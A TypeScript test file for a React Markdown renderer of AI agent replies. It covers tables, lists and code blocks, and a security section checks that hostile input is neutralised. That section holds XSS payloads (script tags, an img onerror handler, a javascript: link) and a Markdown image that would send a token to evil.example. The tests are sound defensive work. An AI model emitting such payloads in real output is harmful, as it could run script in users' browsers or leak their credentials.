import assert from "node:assert/strict";
import { test } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import ReplyText, { plain } from "../components/ReplyText";

const html = (text: string) => renderToStaticMarkup(<ReplyText text={text} />);

test("a table is a table", () => {
  const h = html("| Metric | Before |\n|---|---|\n| LCP | 2.9 s |");
  assert.match(h, /<table>/);
  assert.match(h, /<th[^>]*>Metric<\/th>/);
  assert.match(h, /<td[^>]*>2\.9 s<\/td>/);
  assert.doesNotMatch(h, /\|---/);
});

test("a wide table scrolls in its own box", () => {
  assert.match(html("| a |\n|---|\n| b |"), /class="md-table"/);
});

test("the Markdown agents write renders as what it means", () => {
  const h = html("## Next\n\n3. third\n4. fourth\n\n- one\n  - nested\n\n- [x] done\n\n> quoted\n\n*soft* and ~~gone~~ and **hard** and `code`");
  assert.match(h, /<h3>Next<\/h3>/);
  assert.match(h, /<ol start="3">/);
  assert.match(h, /<ul>\s*<li>nested/);
  assert.match(h, /type="checkbox"/);
  assert.match(h, /<blockquote>/);
  assert.match(h, /<em>soft<\/em>/);
  assert.match(h, /<del>gone<\/del>/);
  assert.match(h, /<strong>hard<\/strong>/);
  assert.match(h, /<code>code<\/code>/);
});

test("a code block keeps its text and offers to copy it", () => {
  const h = html("```js\nconst a = 1;\n```");
  assert.match(h, /<pre><code[^>]*>const a = 1;/);
  assert.match(h, /copy-btn/);
});

// What a reply must never be able to do: the page holds the sign-in token.
test("raw HTML is shown as text, never as markup", () => {
  const h = html('Hello <script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n<iframe src="https://evil.example"></iframe>');
  assert.doesNotMatch(h, /<script|<img|<iframe/);
  assert.match(h, /&lt;script&gt;/);
});

test("a link cannot take anyone anywhere", () => {
  for (const t of ["[click](https://evil.example)", "[x](javascript:alert(1))", "<https://evil.example>", "https://evil.example"]) {
    assert.doesNotMatch(html(t), /<a\b|href=/, t);
  }
  assert.match(html("[click](https://evil.example)"), /click/);
});

test("an image is never loaded, so it cannot carry anything out", () => {
  const h = html("![the secret](https://evil.example/?token=abc)");
  assert.doesNotMatch(h, /<img|evil\.example/);
  assert.match(h, /the secret/);
});

test("empty text is an empty reply, not a crash", () => {
  assert.match(html(""), /reply-text/);
});

test("a preview reads as words", () => {
  assert.equal(plain("| Metric | Before |\n|---|---|\n| LCP | 2.9 s |"), "Metric Before LCP 2.9 s");
  assert.equal(plain("> quoted **bold** [text](https://x.example)"), "quoted bold text");
  assert.equal(plain("before\n```\ncode\n```\nafter"), "before after");
});
